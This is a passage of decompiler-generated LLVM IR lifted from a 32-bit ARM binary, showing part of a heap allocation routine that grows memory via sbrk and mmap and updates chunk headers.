  store i32 %v3_12a94, i32* %r3.global-to-local, align 4
  %v1_12a9c = add i32 %v0_12a88, 884
  %v2_12a9c = inttoptr i32 %v1_12a9c to i32*
  %v3_12a9c = load i32, i32* %v2_12a9c, align 4
  store i32 %v3_12a9c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12a90, %v3_12a8c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12a90, i32* %v2_12a8c, align 4
  %v0_12aa4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12aa4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_12aa4 = phi i32 [ %v0_12a88, %bb151 ], [ %v1_12aa4.pre, %bb152 ]
  %v0_12aa4 = phi i32 [ %v2_12a90, %bb151 ], [ %v0_12aa4.pre, %bb152 ]
  %v2_12aa4 = add i32 %v1_12aa4, 868
  %v3_12aa4 = inttoptr i32 %v2_12aa4 to i32*
  store i32 %v0_12aa4, i32* %v3_12aa4, align 4
  %v0_12aa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12aa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12aa8 = add i32 %v1_12aa8, %v0_12aa8
  store i32 %v2_12aa8, i32* %r1.global-to-local, align 4
  %v1_12aac = load i32, i32* %r2.global-to-local, align 4
  %v0_12ab0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12ab0 = add i32 %v0_12ab0, 8
  store i32 %v1_12ab0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12aa8, %v1_12aac
  br i1 %tmp216, label %bb154, label %dec_label_pc_12dc4

bb154:                                            ; preds = %bb153
  %v5_12ab4 = load i32, i32* %ip.global-to-local, align 4
  %v6_12ab4 = add i32 %v5_12ab4, 884
  %v7_12ab4 = inttoptr i32 %v6_12ab4 to i32*
  store i32 %v2_12aa8, i32* %v7_12ab4, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12abc:                               ; preds = %dec_label_pc_12a00, %dec_label_pc_129e0, %dec_label_pc_12a14.dec_label_pc_12abc_crit_edge, %dec_label_pc_129f0
  %v1_12ae0 = phi i32 [ %v1_12ae0.pre, %dec_label_pc_12a14.dec_label_pc_12abc_crit_edge ], [ %v0_12988, %dec_label_pc_129f0 ], [ %v0_12988, %dec_label_pc_129e0 ], [ %v0_12988, %dec_label_pc_12a00 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v4_12ac4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12ac4, i32* %r3.global-to-local, align 4
  %v1_12ac8 = add i32 %v4_12ac4, 44
  %v2_12ac8 = inttoptr i32 %v1_12ac8 to i32*
  %v3_12ac8 = load i32, i32* %v2_12ac8, align 4
  store i32 %v3_12ac8, i32* %r0.global-to-local, align 4
  %v1_12acc = add i32 %v4_12ac4, 864
  %v2_12acc = inttoptr i32 %v1_12acc to i32*
  %v3_12acc = load i32, i32* %v2_12acc, align 4
  store i32 %v3_12acc, i32* %r2.global-to-local, align 4
  %v1_12ad0 = add i32 %v4_12ac4, 840
  %v2_12ad0 = inttoptr i32 %v1_12ad0 to i32*
  %v3_12ad0 = load i32, i32* %v2_12ad0, align 4
  store i32 %v3_12ad0, i32* %r3.global-to-local, align 4
  %v1_12ad4 = add i32 %v3_12ac8, 4
  %v2_12ad4 = inttoptr i32 %v1_12ad4 to i32*
  %v3_12ad4 = load i32, i32* %v2_12ad4, align 4
  store i32 %v3_12ad4, i32* %r1.global-to-local, align 4
  %v1_12adc = urem i32 %v3_12acc, 2
  %v2_12adc = icmp eq i32 %v1_12adc, 0
  %v1_12ad8 = add i32 %v1_12ae0, 16
  %v2_12ae0 = add i32 %v1_12ad8, %v3_12ad0
  store i32 %v2_12ae0, i32* %r3.global-to-local, align 4
  %v1_12ae4 = and i32 %v3_12ad4, -4
  store i32 %v1_12ae4, i32* @r8, align 4
  br i1 %v2_12adc, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_12abc
  %v3_12ae8 = sub i32 %v2_12ae0, %v1_12ae4
  store i32 %v3_12ae8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_12abc, %bb155
  %v0_12aec = phi i32 [ %v2_12ae0, %dec_label_pc_12abc ], [ %v3_12ae8, %bb155 ]
  %v1_12aec = load i32, i32* %sb.global-to-local, align 4
  %v2_12aec = add i32 %v1_12aec, %v0_12aec
  store i32 %v2_12aec, i32* %r3.global-to-local, align 4
  %v1_12af0 = sub i32 -1, %v1_12aec
  store i32 %v1_12af0, i32* %fp.global-to-local, align 4
  %v2_12af4 = and i32 %v2_12aec, %v1_12af0
  store i32 %v2_12af4, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12af4, 1
  br i1 %tmp157, label %dec_label_pc_12b18, label %dec_label_pc_12b04

dec_label_pc_12b04:                               ; preds = %bb156
  store i32 %v2_12af4, i32* %r0.global-to-local, align 4
  %v1_12b08 = call i32 @__GI_sbrk(i32 %v2_12af4)
  store i32 %v1_12b08, i32* %r0.global-to-local, align 4
  %v3_12b0c = icmp eq i32 %v1_12b08, -1
  store i32 %v1_12b08, i32* @r4, align 4
  br i1 %v3_12b0c, label %dec_label_pc_12b18, label %dec_label_pc_12b84

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12b04, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_12b20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b20, i32* %r6.global-to-local, align 4
  %v1_12b24 = add i32 %v4_12b20, 864
  %v2_12b24 = inttoptr i32 %v1_12b24 to i32*
  %v3_12b24 = load i32, i32* %v2_12b24, align 4
  store i32 %v3_12b24, i32* %r3.global-to-local, align 4
  %v1_12b28 = urem i32 %v3_12b24, 2
  %v2_12b28 = icmp eq i32 %v1_12b28, 0
  br i1 %v2_12b28, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12b18
  %v1_12b2c = load i32, i32* @r8, align 4
  %v2_12b2c = load i32, i32* %sb.global-to-local, align 4
  %v3_12b2c = add i32 %v2_12b2c, %v1_12b2c
  %v2_12b30 = load i32, i32* @r5, align 4
  %v3_12b30 = add i32 %v3_12b2c, %v2_12b30
  store i32 %v3_12b30, i32* %r3.global-to-local, align 4
  %v2_12b34 = load i32, i32* %fp.global-to-local, align 4
  %v3_12b34 = and i32 %v2_12b34, %v3_12b30
  store i32 %v3_12b34, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12b18
  %v0_12b38.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12b38 = phi i32 [ %v0_12b38.pr, %.thread32thread-pre-split ], [ %v3_12b34, %bb158 ]
  %v2_12b38 = icmp ugt i32 %v0_12b38, 1048575
  br i1 %v2_12b38, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12b50 = phi i32 [ %v0_12b38, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12b40 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12b50, %v1_12b40
  br i1 %tmp217, label %dec_label_pc_12b48, label %dec_label_pc_12dac

dec_label_pc_12b48:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12b50, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12b64 = call i32 @mmap(i32 0, i32 %v0_12b50, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12b64, i32* %r0.global-to-local, align 4
  %v3_12b68 = icmp eq i32 %v6_12b64, -1
  %v8_12b68 = icmp eq i32 %v6_12b64, -1
  store i32 %v6_12b64, i32* @r4, align 4
  br i1 %v8_12b68, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12b48
  %v1_12b70 = load i32, i32* %r6.global-to-local, align 4
  %v2_12b70 = add i32 %v1_12b70, 864
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  %v4_12b70 = load i32, i32* %v3_12b70, align 4
  %v2_12b74 = load i32, i32* @r5, align 4
  %v3_12b74 = add i32 %v2_12b74, %v6_12b64
  store i32 %v3_12b74, i32* %r0.global-to-local, align 4
  %v2_12b78 = and i32 %v4_12b70, -2
  store i32 %v2_12b78, i32* %r3.global-to-local, align 4
  store i32 %v2_12b78, i32* %v3_12b70, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12b48, %bb161
  br i1 %v3_12b68, label %dec_label_pc_12b84, label %dec_label_pc_12b88

dec_label_pc_12b84:                               ; preds = %.thread35, %dec_label_pc_12b04
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b88

dec_label_pc_12b88:                               ; preds = %.thread35, %dec_label_pc_12b84
  %v0_12b88 = load i32, i32* @r4, align 4
  %v7_12b88 = icmp eq i32 %v0_12b88, -1
  br i1 %v7_12b88, label %dec_label_pc_12dac, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b88
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v4_12b98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b98, i32* %ip.global-to-local, align 4
  store i32 %v3_12ac8, i32* %r2.global-to-local, align 4
  %v1_12ba0 = add i32 %v4_12b98, 872
  %v2_12ba0 = inttoptr i32 %v1_12ba0 to i32*
  %v3_12ba0 = load i32, i32* %v2_12ba0, align 4
  %v1_12ba4 = load i32, i32* @r8, align 4
  %v2_12ba4 = add i32 %v1_12ba4, %v3_12ac8
  store i32 %v2_12ba4, i32* %r1.global-to-local, align 4
  %v0_12ba8 = load i32, i32* @r5, align 4
  %v2_12ba8 = add i32 %v0_12ba8, %v3_12ba0
  store i32 %v2_12ba8, i32* %r3.global-to-local, align 4
  %v9_12bac = icmp eq i32 %v0_12b88, %v2_12ba4
  br i1 %v9_12bac, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12b90
  store i32 %v2_12ba8, i32* %v2_12ba0, align 4
  br label %dec_label_pc_12bc8

bb162:                                            ; preds = %dec_label_pc_12b90
  %v1_12bb0 = load i32, i32* %r0.global-to-local, align 4
  %v8_12bb0 = icmp eq i32 %v1_12bb0, -1
  store i32 %v2_12ba8, i32* %v2_12ba0, align 4
  br i1 %v8_12bb0, label %.thread37, label %dec_label_pc_12bc8

.thread37:                                        ; preds = %bb162
  %v1_12bb8 = load i32, i32* @r5, align 4
  %v2_12bb8 = load i32, i32* @r8, align 4
  %v3_12bb8 = add i32 %v2_12bb8, %v1_12bb8
  %v2_12bbc = or i32 %v3_12bb8, 1
  store i32 %v2_12bbc, i32* %r3.global-to-local, align 4
  %v2_12bc0 = load i32, i32* %r2.global-to-local, align 4
  %v3_12bc0 = add i32 %v2_12bc0, 4
  %v4_12bc0 = inttoptr i32 %v3_12bc0 to i32*
  store i32 %v2_12bbc, i32* %v4_12bc0, align 4
  br label %dec_label_pc_12d40

dec_label_pc_12bc8:                               ; preds = %bb162, %.thread125
  %v0_12bcc.pr = load i32, i32* @r8, align 4
  %v0_12bc8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12bc8 = add i32 %v0_12bc8, 864
  %v2_12bc8 = inttoptr i32 %v1_12bc8 to i32*
  %v3_12bc8 = load i32, i32* %v2_12bc8, align 4
  store i32 %v3_12bc8, i32* %r2.global-to-local, align 4
  %v2_12bcc = icmp eq i32 %v0_12bcc.pr, 0
  br i1 %v2_12bcc, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12bc8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12bc8
  %v2_12bd4 = urem i32 %v3_12bc8, 2
  store i32 %v2_12bd4, i32* %r3.global-to-local, align 4
  %v2_12bd8 = icmp eq i32 %v2_12bd4, 0
  br i1 %v2_12bd8, label %.thread43, label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %.thread39
  %v0_12be0 = load i32, i32* @r4, align 4
  %v1_12be0 = load i32, i32* %r1.global-to-local, align 4
  %v3_12be0 = icmp ult i32 %v0_12be0, %v1_12be0
  br i1 %v3_12be0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12be0
  %v2_12be4 = and i32 %v3_12bc8, -2
  store i32 %v2_12be4, i32* %r3.global-to-local, align 4
  store i32 %v2_12be4, i32* %v2_12bc8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12be0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v4_12bf4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12bf4, i32* @r7, align 4
  %v1_12bf8 = add i32 %v4_12bf4, 864
  %v2_12bf8 = inttoptr i32 %v1_12bf8 to i32*
  %v3_12bf8 = load i32, i32* %v2_12bf8, align 4
  store i32 %v3_12bf8, i32* %r3.global-to-local, align 4
  %v1_12bfc = urem i32 %v3_12bf8, 2
  store i32 %v1_12bfc, i32* @r6, align 4
  %v2_12bfc = icmp eq i32 %v1_12bfc, 0
  br i1 %v2_12bfc, label %dec_label_pc_12c90, label %dec_label_pc_12c04

dec_label_pc_12c04:                               ; preds = %.thread43
  %v0_12c04 = load i32, i32* @r8, align 4
  %v2_12c04 = icmp eq i32 %v0_12c04, 0
  br i1 %v2_12c04, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12c04
  %v2_12c08 = add i32 %v4_12bf4, 872
  %v3_12c08 = inttoptr i32 %v2_12c08 to i32*
  %v4_12c08 = load i32, i32* %v3_12c08, align 4
  store i32 %v4_12c08, i32* %r2.global-to-local, align 4
  %v1_12c0c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c0c = load i32, i32* @r4, align 4
  %v3_12c0c = sub i32 %v2_12c0c, %v1_12c0c
  %v3_12c10 = add i32 %v3_12c0c, %v4_12c08
  store i32 %v3_12c10, i32* %r3.global-to-local, align 4
  store i32 %v3_12c10, i32* %v3_12c08, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12c04, %bb164
  %v0_12c18 = load i32, i32* @r4, align 4
  %v1_12c18 = urem i32 %v0_12c18, 8
  store i32 %v1_12c18, i32* %r3.global-to-local, align 4
  %v2_12c18 = icmp eq i32 %v1_12c18, 0
  br i1 %v2_12c18, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_12c1c = sub nsw i32 8, %v1_12c18
  store i32 %v2_12c1c, i32* %r3.global-to-local, align 4
  %v3_12c20 = add i32 %v2_12c1c, %v0_12c18
  store i32 %v3_12c20, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12c28 = phi i32 [ 0, %.thread46 ], [ %v2_12c1c, %bb165 ]
  %v1_12c24 = load i32, i32* @r5, align 4
  %v2_12c24 = add i32 %v1_12c24, %v0_12c18
  store i32 %v2_12c24, i32* @r6, align 4
  %v1_12c28 = load i32, i32* @r8, align 4
  %v2_12c28 = add i32 %v2_12c24, %v0_12c28
  %v2_12c2c = add i32 %v2_12c28, %v1_12c28
  store i32 %v2_12c2c, i32* %r1.global-to-local, align 4
  %v1_12c30 = load i32, i32* %sb.global-to-local, align 4
  %v2_12c30 = add i32 %v1_12c30, %v2_12c2c
  %v1_12c34 = load i32, i32* %fp.global-to-local, align 4
  %v2_12c34 = and i32 %v1_12c34, %v2_12c30
  store i32 %v2_12c34, i32* %r2.global-to-local, align 4
  %v2_12c38 = sub i32 0, %v2_12c24
  store i32 %v2_12c38, i32* %r3.global-to-local, align 4
  %v2_12c3c = sub i32 %v2_12c34, %v2_12c24
  store i32 %v2_12c3c, i32* @r5, align 4
  store i32 %v2_12c3c, i32* %r0.global-to-local, align 4
  br i1 %v2_12c18, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12c18, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12c48 = call i32 @__GI_sbrk(i32 %v2_12c3c)
  store i32 %v1_12c48, i32* %r0.global-to-local, align 4
  %v3_12c4c = icmp eq i32 %v1_12c48, -1
  br i1 %v3_12c4c, label %dec_label_pc_12c54, label %dec_label_pc_12c64

dec_label_pc_12c54:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12c58 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12c58, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12c64:                               ; preds = %bb167
  %v1_12c64 = load i32, i32* @r4, align 4
  %v3_12c64 = icmp ult i32 %v1_12c48, %v1_12c64
  br i1 %v3_12c64, label %dec_label_pc_12c6c, label %dec_label_pc_12cbc

dec_label_pc_12c6c:                               ; preds = %dec_label_pc_12c64
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r0.global-to-local, align 4
  %v4_12c74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12c74, i32* %r2.global-to-local, align 4
  %v1_12c78 = add i32 %v4_12c74, 864
  %v2_12c78 = inttoptr i32 %v1_12c78 to i32*
  %v3_12c78 = load i32, i32* %v2_12c78, align 4
  %v0_12c7c = load i32, i32* @r6, align 4
  store i32 %v0_12c7c, i32* %r0.global-to-local, align 4
  %v1_12c80 = and i32 %v3_12c78, -2
  store i32 %v1_12c80, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12c80, i32* %v2_12c78, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12c90:                               ; preds = %.thread43
  %v0_12c90 = load i32, i32* %r0.global-to-local, align 4
  %v3_12c90 = icmp eq i32 %v0_12c90, -1
  br i1 %v3_12c90, label %dec_label_pc_12c98, label %dec_label_pc_12cb4

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c90
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12c9c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12c9c, i32* %r0.global-to-local, align 4
  %v0_12ca0 = load i32, i32* @r7, align 4
  %v1_12ca0 = add i32 %v0_12ca0, 872
  %v2_12ca0 = inttoptr i32 %v1_12ca0 to i32*
  %v3_12ca0 = load i32, i32* %v2_12ca0, align 4
  store i32 %v3_12ca0, i32* %r2.global-to-local, align 4
  %v0_12ca4 = load i32, i32* @r4, align 4
  %v0_12ca8 = load i32, i32* @r5, align 4
  %v2_12ca4 = add i32 %v3_12ca0, %v1_12c9c
  %v2_12ca8 = sub i32 %v2_12ca4, %v0_12ca4
  %v2_12cac = sub i32 %v2_12ca8, %v0_12ca8
  store i32 %v2_12cac, i32* %r3.global-to-local, align 4
  store i32 %v2_12cac, i32* %v2_12ca0, align 4
  %v0_12cb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12c90, %dec_label_pc_12c98
  %v0_12cb8 = phi i32 [ 0, %dec_label_pc_12c90 ], [ %v0_12cb8.pre, %dec_label_pc_12c98 ]
  %v0_12cb4 = load i32, i32* @r4, align 4
  store i32 %v0_12cb4, i32* @r7, align 4
  store i32 %v0_12cb8, i32* @r5, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c64, %dec_label_pc_12c6c, %dec_label_pc_12c54, %dec_label_pc_12cb4
  %v0_12cbc = load i32, i32* %r0.global-to-local, align 4
  %v7_12cbc = icmp eq i32 %v0_12cbc, -1
  br i1 %v7_12cbc, label %dec_label_pc_12d40, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12cbc
  %v1_12cc4 = load i32, i32* @r5, align 4
  %v2_12cc4 = add i32 %v1_12cc4, %v0_12cbc
  %v0_12cc8 = load i32, i32* @r7, align 4
  %v2_12cc8 = sub i32 %v2_12cc4, %v0_12cc8
  %v1_12ccc = or i32 %v2_12cc8, 1
  %v2_12cd0 = add i32 %v0_12cc8, 4
  %v3_12cd0 = inttoptr i32 %v2_12cd0 to i32*
  store i32 %v1_12ccc, i32* %v3_12cd0, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12cdc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12cdc, i32* @r6, align 4
  %v1_12ce0 = add i32 %v4_12cdc, 872
  %v2_12ce0 = inttoptr i32 %v1_12ce0 to i32*
  %v3_12ce0 = load i32, i32* %v2_12ce0, align 4
  %v0_12ce4 = load i32, i32* @r8, align 4
  %v2_12ce4 = icmp eq i32 %v0_12ce4, 0
  %v0_12ce8 = load i32, i32* @r5, align 4
  %v2_12ce8 = add i32 %v0_12ce8, %v3_12ce0
  store i32 %v2_12ce8, i32* %r3.global-to-local, align 4
  store i32 %v2_12ce8, i32* %v2_12ce0, align 4
  %v0_12cf0 = load i32, i32* @r7, align 4
  %v1_12cf0 = load i32, i32* @r6, align 4
  %v2_12cf0 = add i32 %v1_12cf0, 44
  %v3_12cf0 = inttoptr i32 %v2_12cf0 to i32*
  store i32 %v0_12cf0, i32* %v3_12cf0, align 4
  br i1 %v2_12ce4, label %dec_label_pc_12d40, label %dec_label_pc_12cf8

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cc4
  %v0_12cfc = load i32, i32* @r8, align 4
  %v1_12cfc = add i32 %v0_12cfc, -12
  %v1_12d00 = and i32 %v1_12cfc, -8
  store i32 %v3_12ac8, i32* %ip.global-to-local, align 4
  %v2_12d08 = add i32 %v1_12d00, %v3_12ac8
  store i32 %v2_12d08, i32* %r1.global-to-local, align 4
  %v2_12d0c = icmp ugt i32 %v1_12d00, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12d14 = or i32 %v1_12d00, 1
  store i32 %v1_12d14, i32* %r3.global-to-local, align 4
  store i32 %v1_12d14, i32* %v2_12ad4, align 4
  %v0_12d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_12d1c = load i32, i32* %r1.global-to-local, align 4
  %v2_12d1c = add i32 %v1_12d1c, 8
  %v3_12d1c = inttoptr i32 %v2_12d1c to i32*
  store i32 %v0_12d1c, i32* %v3_12d1c, align 4
  %v0_12d20 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d20 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d20 = add i32 %v1_12d20, 4
  %v3_12d20 = inttoptr i32 %v2_12d20 to i32*
  store i32 %v0_12d20, i32* %v3_12d20, align 4
  br i1 %v2_12d0c, label %dec_label_pc_12d28, label %dec_label_pc_12d40

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12cf8
  %v0_12d28 = load i32, i32* @r6, align 4
  %v1_12d28 = add i32 %v0_12d28, 836
  %v2_12d28 = inttoptr i32 %v1_12d28 to i32*
  %v3_12d28 = load i32, i32* %v2_12d28, align 4
  store i32 %v3_12d28, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12d30 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d30 = add i32 %v0_12d30, 8
  store i32 %v1_12d30, i32* @r0, align 4
  store i32 -1, i32* %v2_12d28, align 4
  %v0_12d38 = call i32 @free()
  store i32 %v0_12d38, i32* %r0.global-to-local, align 4
  %v0_12d3c = load i32, i32* @r4, align 4
  %v1_12d3c = load i32, i32* @r6, align 4
  %v2_12d3c = add i32 %v1_12d3c, 836
  %v3_12d3c = inttoptr i32 %v2_12d3c to i32*
  store i32 %v0_12d3c, i32* %v3_12d3c, align 4
  br label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %.thread37, %dec_label_pc_12cf8, %dec_label_pc_12cc4, %dec_label_pc_12cbc, %dec_label_pc_12d28
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r0.global-to-local, align 4
  %v4_12d48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d48, i32* %lr.global-to-local, align 4
  %v1_12d4c = add i32 %v4_12d48, 872
  store i32 %v1_12d4c, i32* %r1.global-to-local, align 4
  %v1_12d50 = inttoptr i32 %v1_12d4c to i32*
  %v2_12d50 = load i32, i32* %v1_12d50, align 4
  store i32 %v2_12d50, i32* %r1.global-to-local, align 4
  %v3_12d50 = add i32 %v4_12d48, 876
  %v4_12d50 = inttoptr i32 %v3_12d50 to i32*
  %v5_12d50 = load i32, i32* %v4_12d50, align 4
  store i32 %v5_12d50, i32* %r3.global-to-local, align 4
  %v1_12d58 = add i32 %v4_12d48, 868
  %v2_12d58 = inttoptr i32 %v1_12d58 to i32*
  %v3_12d58 = load i32, i32* %v2_12d58, align 4
  store i32 %v3_12d58, i32* %r3.global-to-local, align 4
  %v1_12d5c = add i32 %v4_12d48, 884
  %v2_12d5c = inttoptr i32 %v1_12d5c to i32*
  %v3_12d5c = load i32, i32* %v2_12d5c, align 4
  store i32 %v3_12d5c, i32* %r2.global-to-local, align 4
  %v2_12d60 = add i32 %v3_12d58, %v2_12d50
  store i32 %v2_12d60, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12d50, %v5_12d50
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12d40
  store i32 %v2_12d50, i32* %v4_12d50, align 4
  %v0_12d68.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12d68.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12d40, %bb168
  %v1_12d68 = phi i32 [ %v3_12d5c, %dec_label_pc_12d40 ], [ %v1_12d68.pre, %bb168 ]
  %v4_12d6c = phi i32 [ %v2_12d60, %dec_label_pc_12d40 ], [ %v0_12d68.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12d6c, %v1_12d68
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12d6c = load i32, i32* %lr.global-to-local, align 4
  %v6_12d6c = add i32 %v5_12d6c, 884
  %v7_12d6c = inttoptr i32 %v6_12d6c to i32*
  store i32 %v4_12d6c, i32* %v7_12d6c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12d70 = load i32, i32* %lr.global-to-local, align 4
  %v1_12d70 = add i32 %v0_12d70, 44
  %v2_12d70 = inttoptr i32 %v1_12d70 to i32*
  %v3_12d70 = load i32, i32* %v2_12d70, align 4
  store i32 %v3_12d70, i32* %ip.global-to-local, align 4
  %v1_12d74 = add i32 %v3_12d70, 4
  %v2_12d74 = inttoptr i32 %v1_12d74 to i32*
  %v3_12d74 = load i32, i32* %v2_12d74, align 4
  store i32 %v1_12988, i32* %r1.global-to-local, align 4
  %v1_12d7c = and i32 %v3_12d74, -4
  store i32 %v1_12d7c, i32* %r3.global-to-local, align 4
  %v3_12d80 = icmp ult i32 %v1_12d7c, %v1_12988
  br i1 %v3_12d80, label %dec_label_pc_12dac, label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %bb171
  %v0_12d88 = load i32, i32* @sl, align 4
  %v2_12d88 = sub i32 %v1_12d7c, %v0_12d88
  %v2_12d8c = add i32 %v0_12d88, %v3_12d70
  store i32 %v2_12d8c, i32* %r1.global-to-local, align 4
  %v1_12d90 = or i32 %v2_12d88, 1
  store i32 %v1_12d90, i32* %r3.global-to-local, align 4
  %v1_12d94 = or i32 %v0_12d88, 1
  store i32 %v1_12d94, i32* %r2.global-to-local, align 4
  %v1_12d98 = add i32 %v3_12d70, 8
  store i32 %v1_12d98, i32* %r0.global-to-local, align 4
  store i32 %v1_12d94, i32* %v2_12d74, align 4
  %v0_12da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12da0 = load i32, i32* %lr.global-to-local, align 4
  %v2_12da0 = add i32 %v1_12da0, 44
  %v3_12da0 = inttoptr i32 %v2_12da0 to i32*
  store i32 %v0_12da0, i32* %v3_12da0, align 4
  %v0_12da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_12da4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12da4 = add i32 %v1_12da4, 4
  %v3_12da4 = inttoptr i32 %v2_12da4 to i32*
  store i32 %v0_12da4, i32* %v3_12da4, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12dac:                               ; preds = %bb160, %bb171, %dec_label_pc_12b88
  store i32 62576, i32* %r3.global-to-local, align 4
